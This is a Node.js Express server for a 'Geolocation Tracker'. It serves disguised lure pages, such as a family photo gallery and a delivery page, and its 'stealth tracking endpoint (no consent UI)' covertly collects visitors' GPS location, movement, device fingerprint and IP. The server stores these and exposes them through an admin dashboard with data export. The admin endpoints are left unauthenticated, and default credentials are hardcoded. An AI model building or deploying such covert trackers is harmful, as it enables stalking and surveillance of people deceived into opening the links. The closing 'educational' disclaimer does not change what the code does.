const express = require('express');
const axios = require('axios');
const path = require('path');
const rateLimit = require('express-rate-limit');
const cors = require('cors');
const fs = require('fs').promises;
const db = require('./database');

const app = express();
app.set('trust proxy', 1); // Enable trust proxy for Vercel/deployment platforms
const PORT = process.env.PORT || 3000;

// Admin credentials (CHANGE THESE IN PRODUCTION!)
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'Aldrin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Aldrin0921!';

// Production security check
if (process.env.NODE_ENV === 'production' && (!process.env.ADMIN_USERNAME || !process.env.ADMIN_PASSWORD)) {
  console.error('❌ ADMIN_USERNAME and ADMIN_PASSWORD environment variables must be set in production!');
  console.error('⚠️  Using default credentials in production is a major security risk.');
  process.exit(1);
}

// Load configuration
const CONFIG_FILE = path.join(__dirname, 'config.json');
let trackingConfig = null;

async function loadConfig() {
  try {
    const data = await fs.readFile(CONFIG_FILE, 'utf8');
    trackingConfig = JSON.parse(data);
    console.log('✅ Configuration loaded');
  } catch (error) {
    console.error('❌ Failed to load config:', error.message);
    trackingConfig = { trackingPages: {} };
  }
}

async function saveConfig() {
  try {
    await fs.writeFile(CONFIG_FILE, JSON.stringify(trackingConfig, null, 2));
    console.log('✅ Configuration saved');
    return true;
  } catch (error) {
    console.error('❌ Failed to save config:', error.message);
    return false;
  }
}

loadConfig();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Rate limiting to prevent abuse
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // Limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

const locationLimiter = rateLimit({
  windowMs: 5 * 60 * 1000, // 5 minutes
  max: 10, // Limit each IP to 10 location logs per 5 minutes
  message: 'Too many location submissions, please try again later.',
});

app.use(limiter);

// Utility function to extract client IP
const getClientIP = (req) => {
  // Check various headers that might contain the real IP
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return forwarded.split(',')[0].trim();
  }
  return req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress ||
         req.connection.socket?.remoteAddress ||
         'Unknown';
};

// Route: Redirect root to the primary stealth experience
app.get('/', (req, res) => {
  res.redirect(302, '/photos');
});

// Route: Serve stealth tracking page (family photo gallery)
app.get('/track', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'track.html'));
});

// Route: Serve admin dashboard
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Route: Dynamic tracking pages
app.get(['/photos', '/delivery', '/share', '/view', '/album', '/content'], (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dynamic-track.html'));
});

// API: Get page configuration
app.get('/api/page-config/*', (req, res) => {
  const pagePath = req.path.replace('/api/page-config', '');
  
  if (!trackingConfig || !trackingConfig.trackingPages) {
    return res.json({ success: false, error: 'Configuration not loaded' });
  }
  
  // Find matching page configuration
  const page = Object.values(trackingConfig.trackingPages).find(p => p.url === pagePath);
  
  if (!page || !page.enabled) {
    return res.json({ success: false, error: 'Page not found or disabled' });
  }
  
  res.json({ success: true, page });
});

// Admin API: Get all configurations
app.get('/api/admin/config', (req, res) => {
  res.json({ success: true, config: trackingConfig });
});

// Admin API: Update configuration
app.post('/api/admin/config', async (req, res) => {
  try {
    trackingConfig = req.body.config;
    const saved = await saveConfig();
    
    if (saved) {
      res.json({ success: true, message: 'Configuration updated' });
    } else {
      res.status(500).json({ success: false, error: 'Failed to save' });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Route: Log location data
app.post('/log-location', locationLimiter, async (req, res) => {
  try {
    const { latitude, longitude, accuracy, timestamp } = req.body;
    const clientIP = getClientIP(req);
    
    console.log('\n========== LOCATION LOG ==========');
    console.log('Timestamp:', new Date(timestamp).toISOString());
    console.log('Client IP:', clientIP);
    
    // Get IP-based geolocation
    let ipLocation = null;
    try {
      // Using ip-api.com (free, no API key required)
      // Note: This will return localhost info in local development
      const ipApiUrl = clientIP === '::1' || clientIP === '127.0.0.1' 
        ? 'http://ip-api.com/json/' // Get info for public IP
        : `http://ip-api.com/json/${clientIP}`;
      
      const ipResponse = await axios.get(ipApiUrl, {
        timeout: 5000,
        params: {
          fields: 'status,country,regionName,city,lat,lon,isp,query'
        }
      });
      
      if (ipResponse.data.status === 'success') {
        ipLocation = {
          ip: ipResponse.data.query,
          city: ipResponse.data.city,
          region: ipResponse.data.regionName,
          country: ipResponse.data.country,
          latitude: ipResponse.data.lat,
          longitude: ipResponse.data.lon,
          isp: ipResponse.data.isp
        };
        
        console.log('\n--- IP-Based Location (Approximate) ---');
        console.log('IP Address:', ipLocation.ip);
        console.log('Location:', `${ipLocation.city}, ${ipLocation.region}, ${ipLocation.country}`);
        console.log('Coordinates:', `${ipLocation.latitude}, ${ipLocation.longitude}`);
        console.log('ISP:', ipLocation.isp);
      }
    } catch (ipError) {
      console.error('IP Geolocation API Error:', ipError.message);
    }
    
    // Log GPS-based precise location if available
    if (latitude && longitude) {
      console.log('\n--- GPS-Based Location (Precise) ---');
      console.log('Latitude:', latitude);
      console.log('Longitude:', longitude);
      console.log('Accuracy:', accuracy ? `${accuracy} meters` : 'Not provided');
      console.log('Google Maps:', `https://www.google.com/maps?q=${latitude},${longitude}`);
    } else {
      console.log('\n--- GPS-Based Location ---');
      console.log('Status: Not available (User denied or browser unsupported)');
    }
    
    console.log('===================================\n');
    
    // Save to database
    await db.addTrack({
      clientIP,
      ipLocation,
      latitude,
      longitude,
      accuracy,
      timestamp
    });
    
    res.json({
      success: true,
      message: 'Location logged successfully',
      data: {
        ipLocation,
        gpsLocation: latitude && longitude ? {
          latitude,
          longitude,
          accuracy
        } : null
      }
    });
    
  } catch (error) {
    console.error('Error logging location:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to log location',
      error: error.message
    });
  }
});

// Route: Stealth tracking endpoint (no consent UI)
app.post('/api/track', locationLimiter, async (req, res) => {
  try {
    const { 
      latitude, 
      longitude, 
      accuracy, 
      altitude,
      heading,
      speed,
      timestamp,
      deviceInfo,
      pageUrl,
      referrer,
      gpsError
    } = req.body;
    
    const clientIP = getClientIP(req);
    
    console.log('\n========== STEALTH TRACK LOG ==========');
    console.log('⏰ Timestamp:', new Date(timestamp).toISOString());
    console.log('🌐 Client IP:', clientIP);
    console.log('🔍 Device Fingerprint:', deviceInfo?.fingerprint);
    
    // Get IP-based geolocation
    let ipLocation = null;
    try {
      const ipApiUrl = clientIP === '::1' || clientIP === '127.0.0.1' 
        ? 'http://ip-api.com/json/'
        : `http://ip-api.com/json/${clientIP}`;
      
      const ipResponse = await axios.get(ipApiUrl, {
        timeout: 5000,
        params: {
          fields: 'status,country,regionName,city,lat,lon,isp,query'
        }
      });
      
      if (ipResponse.data.status === 'success') {
        ipLocation = {
          ip: ipResponse.data.query,
          city: ipResponse.data.city,
          region: ipResponse.data.regionName,
          country: ipResponse.data.country,
          latitude: ipResponse.data.lat,
          longitude: ipResponse.data.lon,
          isp: ipResponse.data.isp
        };
        
        console.log('📡 IP Location:', `${ipLocation.city}, ${ipLocation.region}, ${ipLocation.country}`);
      }
    } catch (ipError) {
      console.error('IP API Error:', ipError.message);
    }
    
    // Log GPS location if available
    if (latitude && longitude) {
      console.log('🛰️ GPS Location:', `${latitude}, ${longitude}`);
      console.log('🎯 Accuracy:', `±${accuracy || 0} meters`);
      console.log('🗺️ Google Maps:', `https://www.google.com/maps?q=${latitude},${longitude}`);
    } else {
      console.log('🛰️ GPS Location: Not available' + (gpsError ? ` (${gpsError})` : ''));
    }
    
    console.log('📱 Device:', deviceInfo?.platform || 'Unknown');
    console.log('🔗 Page:', pageUrl || 'Unknown');
    console.log('========================================\n');
    
    // Save to database
    const result = await db.addTrack({
      clientIP,
      ipLocation,
      latitude,
      longitude,
      accuracy,
      altitude,
      heading,
      speed,
      timestamp,
      deviceInfo,
      pageUrl,
      referrer,
      gpsError
    });
    
    res.json({
      success: true,
      trackingId: result.trackingId,
      message: 'Tracked successfully'
    });
    
  } catch (error) {
    console.error('Tracking error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Admin: Login endpoint
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    console.log('✅ Admin login successful');
    res.json({ success: true });
  } else {
    console.log('❌ Admin login failed:', username);
    res.status(401).json({ success: false, message: 'Invalid credentials' });
  }
});

// Admin: Get all tracks
app.get('/api/admin/tracks', async (req, res) => {
  try {
    const tracks = await db.getRecentTracks(100);
    const stats = await db.getStats();
    
    res.json({
      success: true,
      tracks,
      stats
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Admin: Export all data
app.get('/api/admin/export', async (req, res) => {
  try {
    const tracks = await db.exportData();
    res.json({
      success: true,
      tracks
    });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Route not found' });
});

// Start server (only when not in serverless environment)
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`\n${'='.repeat(60)}`);
    console.log(`🚀 Geolocation Tracker Server ONLINE`);
    console.log(`${'='.repeat(60)}`);
    console.log(`\n📍 TRACKING PAGES:`);
    console.log(`   Standard (with consent): http://localhost:${PORT}/`);
    console.log(`   Stealth (photo gallery): http://localhost:${PORT}/track`);
    console.log(`\n🔐 ADMIN DASHBOARD:`);
    console.log(`   Dashboard URL: http://localhost:${PORT}/admin`);
    console.log(`   Username: ${ADMIN_USERNAME}`);
    console.log(`   Password: ${ADMIN_PASSWORD}`);
    console.log(`   ⚠️  CHANGE THESE CREDENTIALS IN PRODUCTION!`);
    console.log(`\n📊 API ENDPOINTS:`);
    console.log(`   POST /api/track         - Stealth tracking`);
    console.log(`   POST /log-location      - Standard tracking`);
    console.log(`   GET  /api/admin/tracks  - View all tracks`);
    console.log(`   GET  /api/admin/export  - Export data`);
    console.log(`\n⚖️  LEGAL NOTICE:`);
    console.log(`   This is for educational/testing purposes only.`);
    console.log(`   Always obtain explicit consent before tracking.`);
    console.log(`   Unauthorized tracking is illegal and unethical.`);
    console.log(`\n${'='.repeat(60)}\n`);
  });
}

// Export for Vercel serverless functions
module.exports = app;

